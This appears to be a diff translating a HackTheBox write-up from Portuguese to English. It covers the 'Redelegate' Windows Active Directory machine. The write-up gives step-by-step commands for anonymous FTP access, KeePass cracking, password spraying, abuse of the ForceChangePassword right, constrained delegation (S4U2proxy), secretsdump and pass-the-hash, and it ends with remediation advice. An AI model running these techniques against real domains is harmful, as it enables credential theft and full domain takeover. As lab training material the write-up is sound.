@@ -5,13 +5,13 @@ categories: [Machines, HackTheBox]
 tags: [hackthebox, windows, active-directory, keepass, constrained-delegation, s4u2proxy, secretsdump, pass-the-hash, hard]
 ---
 
-**IP:** 10.129.234.50 | **Dificuldade:** Hard | **OS:** Windows Server 2022 DC | **Domínio:** redelegate.vl
+**IP:** 10.129.234.50 | **Difficulty:** Hard | **OS:** Windows Server 2022 DC | **Domain:** redelegate.vl
 
-## Resumo
+## Summary
 
-Máquina Windows AD com cadeia começando em FTP anônimo que expõe KeePass com credenciais de SQLGuest e arquivo de auditoria sugerindo senhas sazonais. Spray com `Fall2024!` valida `Marie.Curie`. Marie.Curie pertence ao grupo HelpDesk (ForceChangePassword sobre Helen.Frost). Helen.Frost tem `SeEnableDelegationPrivilege` + `GenericAll` sobre `FS01$`. Ataque de constrained delegation: muda senha de FS01$, seta `TRUSTED_TO_AUTH_FOR_DELEGATION` + `msDS-AllowedToDelegateTo = cifs/dc.redelegate.vl`, faz S4U2self/proxy impersonando `Ryan.Cooper` (Domain Admin sem `NOT_DELEGATED`) → secretsdump → PTH → root.
+Windows AD machine with a chain starting at anonymous FTP exposing a KeePass database with SQLGuest credentials and an audit file hinting at seasonal passwords. Spraying `Fall2024!` validates `Marie.Curie`. Marie.Curie is in HelpDesk (ForceChangePassword over Helen.Frost). Helen.Frost has `SeEnableDelegationPrivilege` + `GenericAll` over `FS01$`. Constrained delegation attack: change FS01$ password, set `TRUSTED_TO_AUTH_FOR_DELEGATION` + `msDS-AllowedToDelegateTo = cifs/dc.redelegate.vl`, perform S4U2self/proxy impersonating `Ryan.Cooper` (Domain Admin without `NOT_DELEGATED`) → secretsdump → PTH → root.
 
-> **Nota crítica:** O Administrator tem `NOT_DELEGATED` flag — S4U2self falha com `KDC_ERR_BADOPTION`. Solução: impersonar `Ryan.Cooper`.
+> **Critical note:** Administrator has the `NOT_DELEGATED` flag — S4U2self returns `KDC_ERR_BADOPTION`. Solution: impersonate `Ryan.Cooper` instead.
 
 | Flag | Hash |
 |------|------|
@@ -20,7 +20,7 @@ Máquina Windows AD com cadeia começando em FTP anônimo que expõe KeePass com
 
 ---
 
-## 1. Reconhecimento
+## 1. Reconnaissance
 
 ```bash
 nmap -sV -sC -T4 -Pn --open 10.129.234.50
@@ -28,16 +28,16 @@ echo "10.129.234.50 redelegate.vl dc.redelegate.vl" | sudo tee -a /etc/hosts
 ```
 
 ```
-21/tcp  open  ftp    Microsoft ftpd (Anonymous FTP allowed)
-88/tcp  open  kerberos-sec
-389/tcp open  ldap   (Domain: redelegate.vl)
-1433/tcp open ms-sql-s
-5985/tcp open http   WinRM
+21/tcp   open  ftp    Microsoft ftpd (Anonymous FTP allowed)
+88/tcp   open  kerberos-sec
+389/tcp  open  ldap   (Domain: redelegate.vl)
+1433/tcp open  ms-sql-s
+5985/tcp open  http   WinRM
 ```
 
 ---
 
-## 2. FTP Anônimo + KeePass
+## 2. Anonymous FTP + KeePass
 
 ```bash
 ftp 10.129.234.50  # anonymous / ""
@@ -45,7 +45,7 @@ mget *
 # CyberAudit.txt, Shared.kdbx, TrainingAgenda.txt
 ```
 
-`TrainingAgenda.txt` menciona padrão `SeasonYear!`. Wordlist sazonal:
+`TrainingAgenda.txt` mentions the `SeasonYear!` password pattern. Build a seasonal wordlist:
 
 ```bash
 keepass2john Shared.kdbx > Shared.kdbx.hash
@@ -53,7 +53,7 @@ john Shared.kdbx.hash --wordlist=pass.txt
 # Fall2024!
 ```
 
-Credenciais extraídas: `SQLGuest:zDPBpaF4FywlqIv11vii`
+Credentials extracted: `SQLGuest:zDPBpaF4FywlqIv11vii`
 
 ---
 
@@ -68,7 +68,7 @@ nxc smb 10.129.234.50 -u 'Marie.Curie' -p 'Fall2024!'
 
 ## 4. ForceChangePassword (Marie.Curie → Helen.Frost) + User Flag
 
-Marie.Curie está no grupo **HelpDesk** com ForceChangePassword sobre Helen.Frost:
+Marie.Curie is in the **HelpDesk** group which has ForceChangePassword over Helen.Frost:
 
 ```bash
 getTGT.py redelegate.vl/marie.curie:'Fall2024!' -dc-ip 10.129.234.50
@@ -85,11 +85,11 @@ type C:\Users\Helen.Frost\Desktop\user.txt
 
 ## 5. Constrained Delegation (Helen.Frost → FS01$ → Ryan.Cooper → Administrator)
 
-Helen.Frost tem:
-- **SeEnableDelegationPrivilege** — pode setar flags de delegação no AD
-- **GenericAll** sobre `FS01$` — controle total da conta de máquina
+Helen.Frost has:
+- **SeEnableDelegationPrivilege** — can set delegation flags in AD
+- **GenericAll** over `FS01$` — full control of the machine account
 
-### Configurar FS01$ como TRUSTED_TO_AUTH_FOR_DELEGATION
+### Configure FS01$ as TRUSTED_TO_AUTH_FOR_DELEGATION
 
 ```bash
 bloodyAD -d redelegate.vl -u HELEN.FROST -p 'Password1!' --host dc.redelegate.vl \
@@ -103,9 +103,9 @@ bloodyAD -d redelegate.vl -u HELEN.FROST -p 'Password1!' --host dc.redelegate.vl
   set object FS01$ msDS-AllowedToDelegateTo -v "cifs/dc.redelegate.vl"
 ```
 
-### S4U2Proxy impersonando Ryan.Cooper
+### S4U2Proxy — Impersonate Ryan.Cooper
 
-**IMPORTANTE:** O Administrator tem `NOT_DELEGATED` → usar `Ryan.Cooper` (Domain Admin sem essa flag):
+**IMPORTANT:** Administrator has `NOT_DELEGATED` → use `Ryan.Cooper` (Domain Admin without that flag):
 
 ```bash
 unset KRB5CCNAME
@@ -131,28 +131,28 @@ type C:\Users\Administrator\Desktop\root.txt
 
 ---
 
-## Diagrama
+## Attack Chain
 
 ```
-FTP Anônimo → Shared.kdbx (Fall2024!) → SQLGuest
+Anonymous FTP → Shared.kdbx (Fall2024!) → SQLGuest
   ↓ Password spray Fall2024!
 Marie.Curie → HelpDesk → ForceChangePassword
 Helen.Frost → user.txt
   ↓ SeEnableDelegationPrivilege + GenericAll over FS01$
 FS01$ (Hackme123!) → TRUSTED_TO_AUTH_FOR_DELEGATION + cifs/dc
-  ↓ S4U2proxy (NOT_DELEGATED em Administrator → usar Ryan.Cooper)
+  ↓ S4U2proxy (Administrator has NOT_DELEGATED → use Ryan.Cooper)
 Ryan.Cooper@cifs/dc → secretsdump
 Administrator NTLM → PTH → root.txt
 ```
 
 ---
 
-## Lições Aprendidas
+## Lessons Learned
 
-| Vulnerabilidade | Remediação |
-|-----------------|------------|
-| FTP anônimo expondo KeePass | Desabilitar FTP anônimo; nunca expor DBs de senha |
-| Senhas sazonais (Fall2024!) | Política de complexidade + MFA |
-| ForceChangePassword via grupo HelpDesk | Auditar ACLs de grupos privilegiados |
-| SeEnableDelegationPrivilege + GenericAll em conta de máquina | Remover SeEnableDelegationPrivilege de usuários regulares |
-| NOT_DELEGATED não protege se outro DA não tem o flag | Marcar TODOS os Domain Admins com NOT_DELEGATED ou Protected Users |
+| Vulnerability | Remediation |
+|---------------|-------------|
+| Anonymous FTP exposing KeePass database | Disable anonymous FTP; never expose password databases |
+| Seasonal passwords (Fall2024!) | Password complexity policy + MFA |
+| ForceChangePassword via HelpDesk group | Audit ACLs on privileged groups; least privilege |
+| SeEnableDelegationPrivilege + GenericAll on machine account | Remove SeEnableDelegationPrivilege from regular users |
+| NOT_DELEGATED doesn't protect if another DA lacks the flag | Mark ALL Domain Admins with NOT_DELEGATED or add to Protected Users |
